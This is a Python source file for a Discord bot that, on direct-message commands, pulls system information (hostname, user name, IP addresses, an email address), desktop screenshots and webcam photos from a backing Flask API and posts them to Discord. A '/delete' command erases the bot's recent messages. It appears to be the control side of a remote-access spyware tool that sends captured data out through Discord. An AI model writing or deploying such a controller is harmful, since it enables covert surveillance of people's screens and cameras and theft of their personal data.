import base64
import io
import os
import discord
import requests
import json

"""
#    Read a token from a file and return it
#    Returns: str: The token string
"""


def read_token():
    token_file = os.getenv('DISCORD_BOT_TOKEN_FILE', '/app/discordBot/api_token/token.txt')
    with open(token_file, 'r') as file:
        return file.read().strip()


TOKEN = read_token()  # Token du bot Discord
API_URL = os.getenv('API_URL', 'http://flask-api:5000')  # URL de votre API Flask

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)


async def handle_systeminfo(message):
    response = requests.get(f'{API_URL}/systeminfo')
    if response.status_code == 200:
        data = response.json()
        embed = discord.Embed(title="System Information", color=0xFF0000)
        embed.add_field(name="Timestamp", value=data["timestamp"], inline=False)
        embed.add_field(name="Hostname", value=data["hostname"], inline=False)
        embed.add_field(name="User Name", value=data["user_name"], inline=False)
        embed.add_field(name="Local IP", value=data["local_ip"], inline=False)
        embed.add_field(name="Public IP", value=data["public_ip"], inline=False)
        embed.add_field(name="CPU Usage", value=data["CPU_Usage"], inline=False)
        embed.add_field(name="Memory Usage", value=data["Memory_Usage"], inline=False)
        embed.add_field(name="Email", value=data["email"], inline=False)
        await message.channel.send(embed=embed)
    else:
        await message.channel.send('Failed to retrieve system information.')


async def handle_screenshot(message):
    response = requests.get(f'{API_URL}/screenshot')
    if response.status_code == 200:
        data = response.json()
        image_data = data['image']
        await message.channel.send(file=discord.File(io.BytesIO(base64.b64decode(image_data)), 'screenshot.png'))
    else:
        await message.channel.send('Failed to take screenshot.')


async def handle_webcam(message):
    response = requests.get(f'{API_URL}/webcam')
    if response.status_code == 200:
        data = response.json()
        image_data = data['image']
        await message.channel.send(file=discord.File(io.BytesIO(base64.b64decode(image_data)), 'webcam_photo.jpg'))
    else:
        await message.channel.send('Failed to take webcam photo.')


async def handle_help(message):
    help_text = """
    **Bot Commands**
    `/systeminfo` - Get system information.
    `/screenshot` - Take a screenshot.
    `/webcam` - Take a webcam photo.
    `/delete` - Delete messages sent by the bot.
    `/help` - Show this help message.
    """
    await message.channel.send(help_text)


async def handle_delete(message):
    # Initialize an empty list to store messages
    messages = []
    # Asynchronously iterate through the history
    async for msg in message.channel.history(limit=50):
        messages.append(msg)

    print(messages)
    # Find the last message sent by the bot
    for msg in messages:
        if msg.author == client.user:
            # Delete the found message
            await msg.delete(delay=4)
            # Send a confirmation message (optional)
            confirmation = await message.channel.send('Message deleted.')
            # Delete the confirmation message after 5 seconds (optional)
            await confirmation.delete(delay=5)


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if isinstance(message.channel, discord.DMChannel):
        command = message.content.lower().strip()

        if command == '/systeminfo':
            await handle_systeminfo(message)
        elif command == '/screenshot':
            await handle_screenshot(message)
        elif command == '/webcam':
            await handle_webcam(message)
        elif command == '/help':
            await handle_help(message)
        elif command == '/delete':
            await handle_delete(message)
        else:
            await message.channel.send('Invalid command. Use `/help` for a list of available commands.')


client.run(TOKEN)
